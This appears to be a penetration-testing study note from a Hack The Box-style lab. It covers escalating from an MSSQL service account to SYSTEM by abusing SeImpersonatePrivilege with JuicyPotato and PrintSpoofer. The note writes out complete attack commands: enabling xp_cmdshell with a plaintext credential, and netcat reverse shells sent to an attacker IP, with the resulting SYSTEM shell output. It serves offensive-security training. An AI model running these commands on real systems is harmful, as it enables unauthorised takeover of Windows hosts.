# SeImpersonate and SeAssignPrimaryToken

## Overview

Every Windows process runs with a **token** describing the account context it's running under. Tokens aren't a "secure resource" in the memory-protection sense — they're just data in memory, so an account holding the right privilege can grab and reuse one. Two privileges matter here:

- **SeImpersonatePrivilege** — lets a process impersonate a client token (e.g. via [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw))
- **SeAssignPrimaryTokenPrivilege** — lets a process replace its own primary token (via [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera))

Legit software uses these to hop from Administrator → **SYSTEM** (e.g. asking WinLogon for a SYSTEM token). "**Potato style**" privescs abuse the same mechanism: a service account that *can* `SeImpersonate` but isn't full SYSTEM tricks a SYSTEM-level process into connecting to it, then steals the resulting token.

> [!important] Check this immediately after landing a shell
> Very common when RCE lands you in a **service account** context — web shell on ASP.NET, Jenkins RCE, MSSQL command execution, etc. Always run `whoami /priv` right away; this privilege is a fast, reliable win when present.

Background reading: [Abusing Token Privileges for EOP (hatRiot)](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt), [SeImpersonatePrivilege / SeCreateGlobalPrivilege (MS)](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege).

## Scenario: SQL Service Account → SYSTEM

Foothold: privileged SQL user on a box where IIS/SQL client connections use Windows Auth, so the service impersonates the connecting client to reach other resources (file shares, etc.) — meaning the service account holds **Impersonate a client after authentication**.

In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.


### Connect with mssqlclient.py

```cmd
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

Creds used: `sql_dev:Str0ng_P@ssw0rd!` (obtained from a `logins.sql` file on a share found via **Snaffler**).

### Enable xp_cmdshell
enable the `xp_cmdshell` stored procedure to run operating system commands.
```
SQL> enable_xp_cmdshell
```

> [!tip] No need to type RECONFIGURE
> Impacket's `mssqlclient.py` handles that step automatically after `enable_xp_cmdshell`.

### Confirm context + privileges

```
SQL> xp_cmdshell whoami
nt service\mssql$sqlexpress01

SQL> xp_cmdshell whoami /priv
```

| Privilege | State |
|---|---|
| SeAssignPrimaryTokenPrivilege | Disabled |
| SeIncreaseQuotaPrivilege | Disabled |
| SeChangeNotifyPrivilege | Enabled |
| SeManageVolumePrivilege | Enabled |
| **SeImpersonatePrivilege** | **Enabled** |
| SeCreateGlobalPrivilege | Enabled |
| SeIncreaseWorkingSetPrivilege | Disabled |

`SeImpersonatePrivilege: Enabled` → target for **JuicyPotato** (DCOM/NTLM reflection abuse of `SeImpersonate`/`SeAssignPrimaryToken`).

## JuicyPotato (older Windows / Server, pre-1809)

Upload `JuicyPotato.exe` + `nc.exe`, stand up a listener, then:

```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

| Flag | Meaning |
|---|---|
| `-l` | COM server listening port |
| `-p` | Program to launch (`cmd.exe`) |
| `-a` | Arguments passed to that program |
| `-t` | `createprocess` call to try — `*` = attempt both `CreateProcessWithTokenW` and `CreateProcessAsUser` |

Catch on the listener:

```cmd
s0nam@htb[/htb]$ sudo nc -lnvp 8443
C:\Windows\system32>whoami
nt authority\system
```

> [!warning] Version-limited
> JuicyPotato stops working on **Windows Server 2019** and **Windows 10 1809+** — Microsoft patched the underlying COM behavior.

## PrintSpoofer / RoguePotato (Server 2019 / Win10 1809+)

Same privileges, different technique — abuses the print spooler / RPC instead of the patched DCOM path.

#### Escalating Privileges using PrintSpoofer#### Escalating Privileges using PrintSpoofer

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

Output confirms:
```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

#### Catching Reverse Shell as SYSTEM

If all goes according to plan, we will have a SYSTEM shell on our netcat listener.

   ```
        shellsession
`s0nam@htb[/htb]$ nc -lnvp 8443 
 listening on [any] 8443 ... connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847 Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved.   
 C:\Windows\system32>whoami  
 whoami 
 nt authority\system`
   ```

PrintSpoofer can also spawn a SYSTEM process directly in the current console/desktop (if interactively logged on), not just via reverse shell.

> [!tip] Pick the tool by target version
> - Pre-Server 2019 / pre-Win10 1809 → **JuicyPotato**
> - Server 2019 / Win10 1809+ → **PrintSpoofer** or **RoguePotato**

Further reading: [PrintSpoofer: Abusing Impersonation Privileges (itm4n)](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/).

## Key Takeaways

- [ ] `whoami /priv` immediately after any new shell — `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` enabled is a near-automatic SYSTEM win
- [ ] Service accounts (IIS, MSSQL, Jenkins, etc.) are the classic carriers of this privilege
- [ ] **JuicyPotato** → older/legacy targets (pre-Server 2019, pre-Win10 1809)
- [ ] **PrintSpoofer** / **RoguePotato** → modern targets where JuicyPotato is patched out
- [ ] All "Potato" variants work the same way at a high level: trick a SYSTEM process into handing over its token via local COM/RPC/named-pipe coercion
